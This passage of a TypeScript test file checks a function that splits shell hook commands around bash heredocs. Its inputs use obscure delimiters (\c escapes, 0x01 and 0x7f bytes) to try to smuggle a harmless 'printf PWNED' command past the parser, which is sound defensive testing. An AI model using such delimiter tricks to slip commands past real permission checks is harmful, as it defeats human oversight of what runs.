		"cat <<$'\\c'X",
		"cat it's",
		"\\cX",
		"printf PWNED-10f",
	])
	expect(splitHookCommands("cat <<$'a\\c'\ncat it's\na\\c\nprintf PWNED-10g")).toEqual([
		"cat <<$'a\\c'",
		"cat it's",
		"a\\c",
		"printf PWNED-10g",
	])
	// `\c\c'` is 0x1c + `c` (bash masks the second `\c` pair, probed): the decode continues
	// after the pair instead of eating the closing quote.
	expect(splitHookCommands("cat <<$'E\\c\\c'\ncat it's\nE\u001cc\nprintf PWNED-10h")).toEqual([
		"cat <<$'E\\c\\c'",
		"cat it's",
		"E\u001cc",
		"printf PWNED-10h",
	])
	// Dead negatives: the BEL and plain-`c` lines never terminate this word in bash either,
	// so the fallback merge stays accepted.
	expect(splitHookCommands("cat <<$'\\c'\ncat it's\n\u0007\nprintf PWNED-10i")).toEqual([
		"cat <<$'\\c'",
		"cat it's\n\u0007\nprintf PWNED-10i",
	])
	expect(splitHookCommands("cat <<$'\\c'\ncat it's\nc\nprintf PWNED-10j")).toEqual([
		"cat <<$'\\c'",
		"cat it's\nc\nprintf PWNED-10j",
	])
})

test("splitHookCommands stores quoted-chunk control bytes the way bash does (round 10)", () => {
	// bash's lexer protects 0x01 as `01 01` and 0x7f as `01 7f` in a quoted heredoc word, and
	// terminator lines are compared against those stored bytes (probed for raw and decoded
	// bytes in `$'…'`, `"…"` and `'…'` chunks). A single-0x01 line must NOT terminate.
	expect(splitHookCommands("cat <<$'E\\x01OF'\ncat it's\nE\u0001\u0001OF\nprintf PWNED-10k")).toEqual([
		"cat <<$'E\\x01OF'",
		"cat it's",
		"E\u0001\u0001OF",
		"printf PWNED-10k",
	])
	expect(splitHookCommands("cat <<$'E\\x7fOF'\ncat it's\nE\u0001\u007fOF\nprintf PWNED-10l")).toEqual([
		"cat <<$'E\\x7fOF'",
		"cat it's",
		"E\u0001\u007fOF",
		"printf PWNED-10l",
	])
	// Octal escape, raw byte and dq/sq spellings protect alike.
	expect(splitHookCommands("cat <<$'E\\001OF'\ncat it's\nE\u0001\u0001OF\nprintf PWNED-10m")).toEqual([
		"cat <<$'E\\001OF'",
		"cat it's",
		"E\u0001\u0001OF",
		"printf PWNED-10m",
	])
	expect(splitHookCommands("cat <<$'E\u0001OF'\ncat it's\nE\u0001\u0001OF\nprintf PWNED-10n")).toEqual([
		"cat <<$'E\u0001OF'",
		"cat it's",
		"E\u0001\u0001OF",
		"printf PWNED-10n",
	])
	expect(splitHookCommands("cat <<$'E\u007fOF'\ncat it's\nE\u0001\u007fOF\nprintf PWNED-10o")).toEqual([
		"cat <<$'E\u007fOF'",
		"cat it's",
		"E\u0001\u007fOF",
		"printf PWNED-10o",
	])
	expect(splitHookCommands('cat <<"E\u0001OF"\ncat it\'s\nE\u0001\u0001OF\nprintf PWNED-10p')).toEqual([
		'cat <<"E\u0001OF"',
		"cat it's",
		"E\u0001\u0001OF",
		"printf PWNED-10p",
	])
	expect(splitHookCommands("cat <<'E\u0001OF'\ncat it's\nE\u0001\u0001OF\nprintf PWNED-10q")).toEqual([
		"cat <<'E\u0001OF'",
		"cat it's",
		"E\u0001\u0001OF",
		"printf PWNED-10q",
	])
	// Letter matrix pins: `\cA` is 0x01 (protected), `\cB` is 0x02 (stored single), `\c@` is a
	// NUL that truncates the chunk.
	expect(splitHookCommands("cat <<$'E\\cAOF'\ncat it's\nE\u0001\u0001OF\nprintf PWNED-10r")).toEqual([
		"cat <<$'E\\cAOF'",
		"cat it's",
		"E\u0001\u0001OF",
		"printf PWNED-10r",
	])
	expect(splitHookCommands("cat <<$'E\\cBOF'\ncat it's\nE\u0002OF\nprintf PWNED-10s")).toEqual([
		"cat <<$'E\\cBOF'",
		"cat it's",
		"E\u0002OF",
		"printf PWNED-10s",
	])
	expect(splitHookCommands("cat <<$'E\\c@OF'\ncat it's\nE\nprintf PWNED-10t")).toEqual([
		"cat <<$'E\\c@OF'",
		"cat it's",
		"E",
		"printf PWNED-10t",
	])
	// Negatives: the single-0x01 line never terminates the protected word (bash-dead merge),
	// while an unquoted word char is not protected, so its single-0x01 line does terminate.
	expect(splitHookCommands("cat <<$'E\\x01OF'\ncat it's\nE\u0001OF\nprintf PWNED-10u")).toEqual([
		"cat <<$'E\\x01OF'",
		"cat it's\nE\u0001OF\nprintf PWNED-10u",
	])
	expect(splitHookCommands("cat <<E\u0001OF\ncat it's\nE\u0001OF\nprintf PWNED-10v")).toEqual([
		"cat <<E\u0001OF",
		"cat it's",
		"E\u0001OF",
		"printf PWNED-10v",
	])
})
